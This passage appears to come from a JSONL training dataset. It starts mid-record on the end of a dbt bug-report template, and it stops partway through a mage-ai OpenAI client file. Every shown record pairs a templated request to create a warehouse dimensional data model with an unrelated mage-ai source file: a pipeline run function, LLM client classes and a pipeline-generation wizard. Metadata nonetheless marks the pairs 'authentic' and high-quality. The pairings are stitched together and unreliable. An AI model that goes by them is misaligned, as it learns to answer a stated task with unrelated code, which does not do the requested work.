it in \"Additional Context\")\n    validations:\n      required: false\n  - type: textarea\n    attributes:\n      label: Additional Context\n      description: |\n        Links? References? Anything that will give us more context about the issue you are encountering!\n\n        Tip: You can attach images or log files by clicking this area to highlight it and then dragging files in.\n    validations:\n      required: false\n", "metadata": {"source": "github.com/dbt-labs/dbt-core", "file_path": ".github/ISSUE_TEMPLATE/bug-report.yml", "language": "yaml", "complexity": "simple", "star_count": 11147, "quality_score": 0.8300000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os\nimport sys\n\n\ndef run(\n    pipeline_uuid: str,\n    project_path: str = None,\n    block_uuid: str = None,\n    run_sensors: bool = True,\n    **global_vars,\n) -> None:\n    from mage_ai.data_preparation.executors.executor_factory import ExecutorFactory\n    from mage_ai.data_preparation.models.pipeline import Pipeline\n\n    project_path = os.getcwd() if project_path is None else os.path.abspath(project_path)\n    sys.path.append(os.path.dirname(project_path))\n    pipeline = Pipeline(pipeline_uuid, project_path)\n    if block_uuid is None:\n        ExecutorFactory.get_pipeline_executor(pipeline).execute(\n            analyze_outputs=False,\n            global_vars=global_vars,\n            run_sensors=run_sensors,\n            update_status=False,\n        )\n    else:\n        ExecutorFactory.get_block_executor(pipeline, block_uuid).execute(\n            analyze_outputs=False,\n            global_vars=global_vars,\n            update_status=False,\n        )\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/__init__.py", "language": "python", "complexity": "simple", "star_count": 8424, "quality_score": 0.7899999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from typing import Dict\n\n\nclass AIClient():\n    async def inference_with_prompt(\n            self,\n            variable_values: Dict[str, str],\n            prompt_template: str,\n            is_json_response: bool = True\n    ):\n        \"\"\"\n        Infers with Large Language Model with prompt and variables\n\n        Args:\n            variable_values: variables to be used in the prompt.\n            prompt_template: prompt template to be used to fill with variables for inference.\n            is_json_response: whether the response is in json format or not.\n\n        Returns:\n            We typically suggest response in JSON format. For example:\n                {\n                    'action_code': 'grade == 5 or grade == 6',\n                    'arguments': ['class']\n                }\n        \"\"\"\n        raise Exception('Subclasses must override this method.')\n\n    async def find_block_params(\n            self,\n            block_description: str\n    ):\n        \"\"\"\n        Based on the block descriptionn, find the block type,\n        block language, pipeline type, and config for this block.\n\n        Args:\n          block_description: description of the block functions.\n\n        Returns:\n          return the response in JSON format with following keys:\n            block_type: type of the block: data_loader, transfomer or data_exporter.\n            block_language: language of the block.\n            pipeline_type: type of the pipeline.\n            config: config of the block. It is a JSON including \"action_type\", \"data_source\".\n        \"\"\"\n        raise Exception('Subclasses must override this method.')\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/ai/ai_client.py", "language": "python", "complexity": "simple", "star_count": 8424, "quality_score": 0.8799999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import json\nimport os\nimport re\nfrom typing import Dict\n\nimport requests\n\nfrom mage_ai.ai.ai_client import AIClient\nfrom mage_ai.data_cleaner.transformer_actions.constants import ActionType, Axis\nfrom mage_ai.data_preparation.models.constants import (\n    BlockLanguage,\n    BlockType,\n    PipelineType,\n)\nfrom mage_ai.io.base import DataSource\nfrom mage_ai.orchestration.ai.config import HuggingFaceConfig\n\nheaders = {\n    \"Content-Type\": \"application/json\"\n}\n\nPROMPT_FOR_FUNCTION_PARAMS = \"\"\"\nBased on the code description, answer each question.\n\n`code description: {code_description}`\n\nQuestion BlockType: What is the purpose of the code? Choose one result from:\n['data_loa der', 'data_exporter', 'transformer'].\nIf the code wants to read data from a data source, it is \"data_loader\".\nIf it wants to export data into a data source, it is \"data_exporter\".\nFor the rest manipulation data actions, it is \"transformer\".\n\nQuestion BlockLanguage: What is the intended programming language for this code?\nThe default value is Python, but choose one result from: {block_languages}.\n\nQuestion PipelineType: What is the pipeline type? The default value is Python,\nbut choose one result from: {pipeline_types}.\n\nQuestion ActionType: If BlockType is transformer, what is the action this code tries to perform?\nChoose one result from: {action_types}\n\nQuestion DataSource: If BlockType is data_loader or data_exporter, where the data loads from or\nexport to? Choose one result from: {data_sources}\n\nReturn your responses in JSON format with the question name as the key and\nthe answer as the value.\n\"\"\"\n\n\nclass HuggingFaceClient(AIClient):\n    \"\"\"\n    This HuggingFaceClient is calling a Hugging Face Inference API endpoint\n    with API endpoint and API token: https://huggingface.co/inference-endpoints.\n\n    The model tested and verified is mistral-7b-instruct-v0.1.\n    \"\"\"\n    def __init__(self, hf_config: HuggingFaceConfig):\n        self.api_token = hf_config.huggingface_inference_api_token \\\n            or os.getenv('HUGGINGFACE_INFERENCE_API_TOKEN')\n        self.api = hf_config.huggingface_api or \\\n            os.getenv('HUGGINGFACE_API')\n        print(f'Using Hugging Face API: {self.api}')\n\n    def __parse_function_args(self, function_args: Dict):\n        try:\n            block_type = BlockType(function_args[f'Question {BlockType.__name__}'])\n        except ValueError:\n            raise Exception(f'Error not valid BlockType: \\\n                  {function_args.get(f\"Question {BlockType.__name__}\")}')\n        try:\n            block_language = BlockLanguage(\n                                    function_args.get(\n                                        f'Question {BlockLanguage.__name__}',\n                                        'python'))\n        except ValueError:\n            print(f'Error not valid BlockLanguage: \\\n                  {function_args.get(f\"Question {BlockLanguage.__name__}\")}')\n            block_language = BlockLanguage.PYTHON\n        try:\n            pipeline_type = PipelineType(\n                                    function_args.get(\n                                        f'Question {PipelineType.__name__}',\n                                        'python'))\n        except ValueError:\n            print(f'Error not valid PipelineType: \\\n                  {function_args.get(f\"Question {PipelineType.__name__}\")}')\n            pipeline_type = PipelineType.PYTHON\n        config = {}\n        if block_type == BlockType.TRANSFORMER:\n            try:\n                config['action_type'] = ActionType(\n                                            function_args.get(\n                                                f'Question {ActionType.__name__}'))\n            except ValueError:\n                print(f'Error not valid ActionType: \\\n                    {function_args.get(f\"Question {ActionType.__name__}\")}')\n                config['action_type'] = None\n            if config['action_type']:\n                if config['action_type'] in [\n                    ActionType.FILTER,\n                    ActionType.DROP_DUPLICATE,\n                    ActionType.REMOVE,\n                    ActionType.SORT\n                ]:\n                    config['axis'] = Axis.ROW\n                else:\n                    config['axis'] = Axis.COLUMN\n        if block_type == BlockType.DATA_EXPORTER or block_type == BlockType.DATA_LOADER:\n            try:\n                config['data_source'] = DataSource(\n                                            function_args.get(\n                                                f'Question {DataSource.__name__}'))\n            except ValueError:\n                print(f'Error not valid DataSource: \\\n                    {function_args.get(f\"Question {DataSource.__name__}\")}')\n        output = {}\n        output['block_type'] = block_type\n        output['block_language'] = block_language\n        output['pipeline_type'] = pipeline_type\n        output['config'] = config\n        return output\n\n    async def inference_with_prompt(\n            self,\n            variable_values: Dict[str, str],\n            prompt_template: str,\n            is_json_response: bool = True\n    ):\n        formated_prompt = prompt_template.format(**variable_values)\n        data = json.dumps({\n            'inputs': formated_prompt,\n            'parameters': {\n                'return_full_text': False,\n                'max_new_tokens': 800,\n                'num_return_sequences': 1}})\n        headers.update(\n            {'Authorization': f'Bearer {self.api_token}'})\n        response = requests.post(self.api, headers=headers, data=data)\n        response_json = response.json()\n        if 'error' in response_json:\n            if response_json['error'] == 'Bad Gateway':\n                raise Exception('Error hugging face endpoint Bad Gateway. \\\n                                Please start hugging face inference endpoint.')\n            print(f'Unexpected error from hugging face: {response_json[\"error\"]}')\n            return \"\"\n        generated_text = response.json()[0]['generated_text'].lstrip('\\n')\n        if is_json_response:\n            # Clean up unexpected JSON format.\n            generated_text = re.sub(r'^```json', '', generated_text)\n            generated_text = re.sub(r'```$', '', generated_text)\n            generated_text = re.sub(r'\"\"\"', '\"', generated_text)\n            return json.loads(generated_text, strict=False)\n        return generated_text\n\n    async def find_block_params(\n            self,\n            block_description: str):\n        variable_values = dict()\n        variable_values['code_description'] = block_description\n        variable_values['block_languages'] = \\\n            [f'{type.name.lower()}' for type in BlockLanguage]\n        variable_values['pipeline_types'] = \\\n            [f'{type.name.lower()}' for type in PipelineType]\n        variable_values['action_types'] = \\\n            [f'{type.name.lower()}' for type in ActionType]\n        variable_values['data_sources'] = \\\n            [f\"{type.name.lower()}\" for type in DataSource]\n        function_params_response = await self.inference_with_prompt(\n            variable_values, PROMPT_FOR_FUNCTION_PARAMS, is_json_response=True)\n        return self.__parse_function_args(function_params_response)\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/ai/hugging_face_client.py", "language": "python", "complexity": "medium", "star_count": 8424, "quality_score": 0.9099999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import ast\nimport asyncio\nimport json\nimport re\nfrom typing import Dict, List\n\nimport astor\nfrom jinja2.exceptions import TemplateNotFound\nfrom langchain.chains import LLMChain\nfrom langchain.prompts import PromptTemplate\n\nfrom mage_ai.ai.hugging_face_client import HuggingFaceClient\nfrom mage_ai.ai.openai_client import OpenAIClient\nfrom mage_ai.data_cleaner.transformer_actions.constants import ActionType\nfrom mage_ai.data_preparation.models.block import Block\nfrom mage_ai.data_preparation.models.constants import (\n    NON_PIPELINE_EXECUTABLE_BLOCK_TYPES,\n    AIMode,\n    BlockLanguage,\n    BlockType,\n    PipelineType,\n)\nfrom mage_ai.data_preparation.models.pipeline import Pipeline\nfrom mage_ai.data_preparation.repo_manager import get_repo_config, get_repo_path\nfrom mage_ai.data_preparation.templates.template import (\n    fetch_template_source,\n    fetch_transformer_default_template,\n    is_default_transformer_template,\n)\nfrom mage_ai.io.base import DataSource\nfrom mage_ai.orchestration.ai.config import AIConfig\nfrom mage_ai.server.logger import Logger\nfrom mage_ai.settings import ENABLE_HUGGING_FACE, ENABLE_OPEN_AI\n\nlogger = Logger().new_server_logger(__name__)\n\nBLOCK_LANGUAGE_TO_FILE_TYPE_VARIABLE = {\n    BlockLanguage.MARKDOWN: 'markdown script',\n    BlockLanguage.PYTHON: 'python script',\n    BlockLanguage.R: 'R script',\n    BlockLanguage.SQL: 'sql script',\n    BlockLanguage.YAML: 'yaml configuration',\n}\nBLOCK_TYPE_TO_PURPOSE_VARIABLE = {\n    BlockType.DATA_LOADER: \"load data from a specific data source.\",\n    BlockType.DATA_EXPORTER: \"export data to a specific data source.\",\n    BlockType.TRANSFORMER: \"transform data from one format into different format.\",\n}\nDATA_LOADERS_FOLDER = 'data_loaders'\nDATA_EXPORTERS_FOLDER = 'data_exporters'\nPROMPT_FOR_BLOCK = \"\"\"\nThe {file_type} delimited by triple backticks is used to {purpose}.\nWrite a documentation based on the {file_type}. {add_on_prompt}\nIgnore the imported libraries and the @test decorator.\n```{block_content}```\"\"\"\nPROMPT_FOR_SUMMARIZE_BLOCK_DOC = \"\"\"\nA data pipeline reads data from source, transform the data and export data into another source.\nThe content delimited by triple backticks contains explains of all components in one data pipeline.\nWrite a detailed summarization of the data pipeline based on the content provided.\n```{block_content}```\"\"\"\n\n# Prompt to ask LLM to generate code based on the code description.\n# Respond in JSON format.\nPROMPT_FOR_CUSTOMIZED_CODE_IN_PYTHON = \"\"\"\nThe content within the triple backticks is a code description.\n\nYour task is to answer the following two questions.\n\n1. Is there any filter logic mentioned in the description to remove rows or columns of the data?\nIf yes, write ONLY the filter logic as a if condition without \"if\" at beginning.\nReturn your response as one field in JSON format with the key \"action_code\".\n\n2. Does the description mention any columns or rows to aggregrate on or group by?\nIf yes, list ONLY those columns in an array and return it as a field in JSON response\nwith the key \"arguments\".\n\n<code description>: ```{code_description}```\n\nProvide your response in JSON format.\n\"\"\"\n\n# Prompt to ask LLM to generate SQL code based on the code description.\n# Respond in JSON format.\nPROMPT_FOR_CUSTOMIZED_CODE_IN_SQL = \"\"\"\nThe content within the triple backticks is a code description.\nImplement it in SQL language.\n\n<code description>: ```{code_description}```\n\nReturn your response in JSON format with the key \"sql_code\".\n\"\"\"\n\n# Prompt to ask LLM to generate code when base template is used.\n# Respond in JSON format.\nPROMPT_FOR_CUSTOMIZED_CODE_WITH_BASE_TEMPLATE = \"\"\"\nThe content within the triple backticks is a code description.\nImplement it in {code_language} language.\n\n<code description>: ```{code_description}```\n\nProvide your response in JSON format with the key \"code\".\n\"\"\"\nPROMPT_TO_SPLIT_BLOCKS = \"\"\"\nA BLOCK does one action either reading data from one data source, transforming the data from\none format to another or exporting data into a data source.\nBased on the code description delimited by triple backticks, your task is to identify\nhow many BLOCKS required, function for each BLOCK and upstream blocks between BLOCKs.\n\nUse the following format:\nBLOCK 1: function: <block function>. upstream: <upstream blocks>\nBLOCK 2: function: <block function>. upstream: <upstream blocks>\nBLOCK 3: function: <block function>. upstream: <upstream blocks>\n...\n\nExample:\n<code description>: ```\nRead data from MySQL and Postgres, filter out rows with book_price > 100, and save data to BigQuery.\n```\n\nAnswer:\nBLOCK 1: function: load data from MySQL. upstream:\nBLOCK 2: function: load data from Postgres. upstream:\nBLOCK 3: function: filter out rows with book_price > 100. upstream: 1, 2\nBLOCK 4: function: export data to BigQuery. upstream: 3\n\n<code description>: ```{code_description}```\"\"\"\nPROMPT_FOR_FUNCTION_COMMENT = \"\"\"\nThe content within the triple backticks is a code block.\nYour task is to write comments for each function inside.\n\n```{block_content}```\n\nThe comment should follow Google Docstring format.\nReturn your response in JSON format with function name as key and the comment as value.\n\"\"\"\nBLOCK_SPLIT_PATTERN = r\"BLOCK\\s+(\\w+):\\s+function:\\s+(.*?)\\.\\s+upstream:\\s*(.*?)$\"\nTRANSFORMERS_FOLDER = 'transformers'\nCLASSIFICATION_FUNCTION_NAME = \"classify_description\"\nTEMPLATE_CLASSIFICATION_FUNCTION = [\n    {\n        \"name\": CLASSIFICATION_FUNCTION_NAME,\n        \"description\": \"Classify the code description provided into following properties.\",\n        \"parameters\": {\n            \"type\": \"object\",\n            \"properties\": {\n                BlockType.__name__: {\n                    \"type\": \"string\",\n                    \"description\": \"Type of the code block. It either \"\n                                   \"loads data from a source, export data to a source \"\n                                   \"or transform data from one format to another.\",\n                    \"enum\": [f\"{BlockType.__name__}__data_exporter\",\n                             f\"{BlockType.__name__}__data_loader\",\n                             f\"{BlockType.__name__}__transformer\"]\n                },\n                BlockLanguage.__name__: {\n                    \"type\": \"string\",\n                    \"description\": \"Programming language of the code block. \"\n                                   f\"Default value is {BlockLanguage.__name__}__python.\",\n                    \"enum\": [\n                        f\"{BlockLanguage.__name__}__{type.name.lower()}\"\n                        for type in BlockLanguage]\n                },\n                PipelineType.__name__: {\n                    \"type\": \"string\",\n                    \"description\": \"Type of pipeline to build. Default value is \"\n                                   f\"{PipelineType.__name__}__python if pipeline type \"\n                                   \"is not mentioned in the description.\",\n                    \"enum\": [\n                        f\"{PipelineType.__name__}__{type.name.lower()}\"\n                        for type in PipelineType]\n                },\n                ActionType.__name__: {\n                    \"type\": \"string\",\n                    \"description\": f\"If {BlockType.__name__} is transformer, \"\n                                   f\"{ActionType.__name__} specifies what kind \"\n                                   \"of action the code performs.\",\n                    \"enum\": [f\"{ActionType.__name__}__{type.name.lower()}\" for type in ActionType]\n                },\n                DataSource.__name__: {\n                    \"type\": \"string\",\n                    \"description\": f\"If {BlockType.__name__} is data_loader or \"\n                                   f\"data_exporter, {DataSource.__name__} field specify \"\n                                   \"where the data loads from or exports to.\",\n                    \"enum\": [f\"{DataSource.__name__}__{type.name.lower()}\" for type in DataSource]\n                },\n            },\n            \"required\": [BlockType.__name__, BlockLanguage.__name__, PipelineType.__name__],\n        },\n    }\n]\n\n\nclass LLMPipelineWizard:\n    def __init__(self):\n        ai_config = AIConfig.load(config=get_repo_config().ai_config)\n        if ENABLE_OPEN_AI and ai_config.mode == AIMode.OPEN_AI:\n            self.client = OpenAIClient(ai_config.open_ai_config)\n        elif ENABLE_HUGGING_FACE and ai_config.mode == AIMode.HUGGING_FACE:\n            self.client = HuggingFaceClient(ai_config.hugging_face_config)\n        else:\n            raise Exception('AI Mode is not available. ENABLE_OPEN_AI: '\n                            f'{ENABLE_OPEN_AI}, ENABLE_HUGGING_FACE: {ENABLE_HUGGING_FACE}')\n\n    async def __async_llm_call(\n        self,\n        variable_values: Dict[str, str],\n        prompt_template: str,\n        is_json_response: bool = True,\n    ):\n        \"\"\"Generic function to call OpenAI LLM and return JSON response by default.\n\n        Fill variables and values into template, and run against LLM\n        to genenrate JSON format response.\n\n        Args:\n            variable_values: all required variable and values in prompt.\n            prompt_template: prompt template for LLM call.\n            is_json_response: default is json formatted response.\n\n        Returns:\n            We typically suggest response in JSON format. For example:\n                {\n                    'action_code': 'grade == 5 or grade == 6',\n                    'arguments': ['class']\n                }\n        \"\"\"\n        filled_prompt = PromptTemplate(\n            input_variables=list(variable_values.keys()),\n            template=prompt_template,\n        )\n        chain = LLMChain(llm=self.llm, prompt=filled_prompt)\n        if is_json_response:\n            return json.loads(await chain.arun(variable_values))\n        return await chain.arun(variable_values)\n\n    async def __async_create_customized_code_in_block(\n            self,\n            block_code: str,\n            block_language: str,\n            code_description: str) -> str:\n        \"\"\"\n        Based on the code description to generate code.\n        It supports both python or SQL languages.\n        \"\"\"\n        variable_values = dict()\n        variable_values['code_description'] = code_description\n        if block_language == BlockLanguage.PYTHON:\n            customized_logic = await self.client.inference_with_prompt(\n                variable_values,\n                PROMPT_FOR_CUSTOMIZED_CODE_IN_PYTHON\n            )\n            if 'action_code' in customized_logic.keys() \\\n                and customized_logic.get('action_code') \\\n                    and \"null\" != customized_logic.get('action_code'):\n                block_code = block_code.replace(\n                    'action_code=\\'\\'',\n                    f'action_code=\\'{customized_logic.get(\"action_code\")}\\'')\n            if 'arguments' in customized_logic.keys():\n                block_code = block_code.replace(\n                    'arguments=[]',\n                    f'arguments={customized_logic.get(\"arguments\")}')\n        elif block_language == BlockLanguage.SQL:\n            customized_logic = await self.client.inference_with_prompt(\n                variable_values,\n                PROMPT_FOR_CUSTOMIZED_CODE_IN_SQL\n            )\n            if 'sql_code' in customized_logic.keys():\n                block_code = f'{block_code}\\n{customized_logic.get(\"sql_code\")}'\n        return block_code\n\n    async def generate_code_async(\n        self,\n        block_description: str,\n        code_language: BlockLanguage,\n        block_type: BlockType = None,\n    ) -> Dict:\n        resp = await self.client.inference_with_prompt(\n            dict(\n                code_description=block_description,\n                code_language=code_language,\n            ),\n            PROMPT_FOR_CUSTOMIZED_CODE_WITH_BASE_TEMPLATE,\n        )\n\n        if not block_type:\n            return resp\n\n        code = resp.get('code')\n        if code:\n            block_code = fetch_template_source(\n                block_type=block_type,\n                config=dict(existing_code='\\n'.join([f'    {line}' for line in code.split('\\n')])),\n                language=code_language,\n            )\n\n            return dict(\n                code=code,\n                content=block_code,\n                block_type=block_type,\n                language=code_language,\n            )\n\n    async def async_generate_block_with_description(\n            self,\n            block_description: str,\n            upstream_blocks: List[str] = None) -> dict:\n        function_params = await self.client.find_block_params(block_description)\n        block_type = function_params['block_type']\n        block_language = function_params['block_language']\n        pipeline_type = function_params['pipeline_type']\n        config = function_params['config']\n        variable_values = dict()\n        variable_values['code_description'] = block_description\n        variable_values['code_language'] = block_language\n        if is_default_transformer_template(config):\n            customized_logic = await self.client.inference_with_prompt(\n                variable_values,\n                PROMPT_FOR_CUSTOMIZED_CODE_WITH_BASE_TEMPLATE\n            )\n            if 'code' in customized_logic.keys():\n                config['existing_code'] = customized_logic.get('code')\n            block_code = fetch_template_source(\n                    block_type=block_type,\n                    config=config,\n                    language=block_language,\n                    pipeline_type=pipeline_type,\n                )\n        else:\n            try:\n                block_code_template = fetch_template_source(\n                        block_type=block_type,\n                        config=config,\n                        language=block_language,\n                        pipeline_type=pipeline_type,\n                    )\n                block_code = await self.__async_create_customized_code_in_block(\n                    block_code_template,\n                    block_language,\n                    block_description)\n            except TemplateNotFound:\n                # Use default template if template not found and\n                # ask LLM to fully generate the customized code.\n                customized_logic = await self.client.inference_with_prompt(\n                    variable_values,\n                    PROMPT_FOR_CUSTOMIZED_CODE_WITH_BASE_TEMPLATE\n                )\n                if 'code' in customized_logic.keys():\n                    block_code = fetch_transformer_default_template(\n                        customized_logic.get('code'))\n\n        return dict(\n            block_type=block_type,\n            configuration=config,\n            content=block_code,\n            language=block_language,\n            upstream_blocks=upstream_blocks,\n        )\n\n    async def __async_generate_blocks(self,\n                                      block_dict: dict,\n                                      block_id: int,\n                                      block_description: str,\n                                      upstream_blocks: [str]) -> dict:\n        block = await self.async_generate_block_with_description(block_description, upstream_blocks)\n        block_dict[block_id] = block\n\n    async def async_generate_pipeline_from_description(self, pipeline_description: str) -> dict:\n        variable_values = dict()\n        variable_values['code_description'] = pipeline_description\n        splited_block_descriptions = await self.client.inference_with_prompt(\n            variable_values,\n            PROMPT_TO_SPLIT_BLOCKS,\n            is_json_response=False,\n        )\n        blocks = {}\n        block_tasks = []\n        for line in splited_block_descriptions.strip().split('\\n'):\n            if line.startswith('BLOCK') and ':' in line:\n                # Extract the block_id and block_description from the line\n                match = re.search(BLOCK_SPLIT_PATTERN, line)\n                if match:\n                    block_id = match.group(1)\n                    block_description = match.group(2).strip()\n                    upstream_blocks = match.group(3).split(', ')\n                    block_tasks.append(\n                        self.__async_generate_blocks(\n                            blocks,\n                            block_id,\n                            block_description,\n                            upstream_blocks))\n        await asyncio.gather(*block_tasks)\n        return blocks\n\n    def __insert_comments_in_functions(self, code: str, function_comments: Dict):\n        # Parse the input code into an abstract syntax tree (AST).\n        tree = ast.parse(code)\n        # Traverse the AST and find function definitions.\n        for node in ast.walk(tree):\n            if isinstance(node, ast.FunctionDef):\n                function_name = node.name\n                if function_comments.get(function_name):\n                    comment_text = function_comments[function_name]\n                    # Insert a comment node below a given node.\n                    if isinstance(node.body[0], ast.Expr) and \\\n                       isinstance(node.body[0].value, ast.Constant):\n                        # If there is existing doc string, combine the new comment with it.\n                        existing_comment_node = node.body[0]\n                        existing_comment_text = node.body[0].value.value\n                        new_comment = ast.Expr(\n                            value=ast.Str(s=f\"{comment_text}\\n{existing_comment_text}\"))\n                        node.body.remove(existing_comment_node)\n                    else:\n                        # Add newly generated doc string.\n                        new_comment = ast.Expr(value=ast.Str(s=comment_text))\n                    node.body.insert(0, new_comment)\n        return astor.to_source(tree)\n\n    async def async_generate_comment_for_block(self, block_content: str) -> str:\n        variable_values = dict()\n        variable_values['block_content'] = block_content\n        function_comments = await self.client.inference_with_prompt(\n            variable_values,\n            PROMPT_FOR_FUNCTION_COMMENT\n        )\n        return self.__insert_comments_in_functions(block_content, function_comments)\n\n    async def async_generate_doc_for_pipeline(\n        self,\n        pipeline_uuid: str,\n        project_path: str = None,\n        print_block_doc: bool = False,\n    ) -> dict:\n        pipeline = Pipeline.get(\n            uuid=pipeline_uuid,\n            repo_path=project_path or get_repo_path(),\n        )\n        async_block_docs = []\n        for block in pipeline.blocks_by_uuid.values():\n            if block.type in NON_PIPELINE_EXECUTABLE_BLOCK_TYPES:\n                continue\n            async_block_docs.append(self.__async_generate_doc_for_block(block))\n        block_docs = await asyncio.gather(*async_block_docs)\n        block_docs_content = '\\n'.join(block_docs)\n        if print_block_doc:\n            print(block_docs_content)\n        variable_values = dict()\n        variable_values['block_content'] = block_docs_content\n        pipeline_doc = await self.client.inference_with_prompt(\n                variable_values,\n                PROMPT_FOR_SUMMARIZE_BLOCK_DOC,\n                is_json_response=False\n            )\n        return dict(\n            block_docs=block_docs,\n            pipeline_doc=pipeline_doc,\n        )\n\n    async def async_generate_doc_for_block(\n        self,\n        pipeline_uuid: str,\n        block_uuid: str,\n        project_path: str = None,\n    ) -> str:\n        pipeline = Pipeline.get(uuid=pipeline_uuid,\n                                repo_path=project_path or get_repo_path())\n        return await self.__async_generate_doc_for_block(pipeline.get_block(block_uuid))\n\n    async def __async_generate_doc_for_block(\n        self,\n        block: Block,\n    ) -> str:\n        add_on_prompt = ''\n        if block.type == BlockType.TRANSFORMER:\n            add_on_prompt = 'Focus on the customized business logic in execute_transformer_action' \\\n                            'function.'\n        variable_values = dict()\n        # Remove the @test function so hugging face can generate documentation.\n        variable_values['block_content'] = re.sub(\n            r'\\s*\\n*\\s*@test.*', '', block.content, flags=re.DOTALL)\n        variable_values['file_type'] = BLOCK_LANGUAGE_TO_FILE_TYPE_VARIABLE.get(block.language, \"\")\n        variable_values['purpose'] = BLOCK_TYPE_TO_PURPOSE_VARIABLE.get(block.type, \"\")\n        variable_values['add_on_prompt'] = add_on_prompt\n        return await self.client.inference_with_prompt(\n            variable_values, PROMPT_FOR_BLOCK, is_json_response=False)\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/ai/llm_pipeline_wizard.py", "language": "python", "complexity": "complex", "star_count": 8424, "quality_score": 0.97, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import json\nimport os\nfrom typing import Dict\n\nimport openai\nfrom langchain.chains import LLMChain\nfrom langchain.llms import OpenAI\nfrom langchain.prompts import PromptTemplate\nfrom openai import OpenAI as OpenAILib\n\nfrom mage_ai.ai.ai_client import AIClient\nfrom mage_ai.data_cleaner.transformer_actions.constants import ActionType, Axis\nfrom mage_ai.data_preparation.models.constants import (\n    BlockLanguage,\n    BlockType,\n    PipelineType,\n)\nfrom mage_ai.data_preparation.repo_manager import get_repo_config\nfrom mage_ai.io.base import DataSource\nfrom mage_ai.orchestration.ai.config import OpenAIConfig\n\nCLASSIFICATION_FUNCTION_NAME = \"classify_description\"\ntools = [\n    {\n        \"type\": \"function\",\n        \"function\": {\n            \"name\": CLASSIFICATION_FUNCTION_NAME,\n            \"description\": \"Classify the code description provided into following properties.\",\n            \"parameters\": {\n                \"type\": \"object\",\n                \"properties\": {\n                    BlockType.__name__: {\n                        \"type\": \"string\",\n                        \"description\": \"Type of the code block. It either \"\n                                       \"loads data from a source, export data to a source \"\n                                       \"or transform data from one format to another.\",\n                        \"enum\": [f\"{BlockType.__name__}__data_exporter\",\n                                 f\"{BlockType.__name__}__data_loader\",\n                                 f\"{BlockType.__name__}__transformer\"]\n                    },\n                    BlockLanguage.__name__: {\n                        \"type\": \"string\",\n                        \"description\": \"Programming language of the code block. \"\n                                       f\"Default value is {BlockLanguage.__name__}__python.\",\n                        \"enum\": [\n                            f\"{BlockLanguage.__name__}__{type.name.lower()}\"\n                            for type in BlockLanguage]\n                    },\n                    PipelineType.__name__: {\n                        \"type\": \"string\",\n                        \"description\": \"Type of pipeline to build. Default value is \"\n                                       f\"{PipelineType.__name__}__python if pipeline type \"\n                                       \"is not mentioned in the description.\",\n                        \"enum\": [\n                            f\"{PipelineType.__name__}__{type.name.lower()}\"\n                            for type in PipelineType]\n                    },\n                    ActionType.__name__: {\n                        \"type\": \"string\",\n                        \"description\": f\"If {BlockType.__name__} is transformer, \"\n                                       f\"{ActionType.__name__} specifies what kind \"\n                                       \"of action the code performs.\",\n                        \"enum\": [f\"{ActionType.__name__}__{type.name.lower()}\"\n                                 for type in ActionType]\n                    },\n                    DataSource.__name__: {\n                        \"type\": \"string\",\n                        \"description\": f\"If {BlockType.__name__} is data_loader or \"\n                                       f\"data_exporter, {DataSource.__name__} field specify \"\n                                       \"where the data loads from or exports to.\",\n                        \"enum\": [f\"{DataSource.__name__}__{type.name.lower()}\"\n                                 for type in DataSource]\n                    },\n                },\n                \"required\": [BlockType.__name__, BlockLanguage.__name__, PipelineType.__name__],\n            },\n        }\n    },\n]\nGPT_MODEL = \"gpt-4o\"\n\n\nclass OpenAIClient(AIClient):\n    def __init__(self, open_ai_config: OpenAIConfig):\n        repo_config = get_repo_config()\n        openai_api_key = repo_config.openai_api_key or \\\n            open_ai_config.openai_api_key or os.getenv('OPENAI_API_KEY')\n        openai.api_key = openai_api_key\n        self.llm = OpenAI(openai_api_key=openai_api_key, temperature=0)\n        self.openai_client = OpenAILib(api_key=openai_api_key)\n\n    def __chat_completion_request(self, messages):\n        try:\n            response = self.openai_client.chat.completions.create(\n                model=GPT_MODEL,\n                messages=messages,\n                tools=tools,\n                tool_choice={\n                    \"type\": \"function\", \"function\": {\"name\": CLASSIFICATION_FUNCTION_NAME}},\n            )\n            return response\n        except Exception as e:\n            print(\"Unable to generate ChatCompletion response\")\n            print(f\"Exception: {e}\")\n            return e\n\n    async def inference_with_prompt(\n            self,\n            variable_values: Dict[str, str],\n            prompt_template: str,\n            is_json_response: bool = True\n    ):\n        \"\"\"Generic function to call OpenAI LLM and return JSON response by default.\n\n        Fill variables and values into template, and run against LLM\n        to genenrate JSON format response.\n\n        Args:\n            variable_values: all required variable and values in prompt.\n            prompt_template: prompt template for LLM call.\n            is_json_response: default is json formatted response.\n\n        Returns:\n            We typically suggest response in JSON format. For example:\n                {\n                    'action_code': 'grade == 5 or grade == 6',\n                    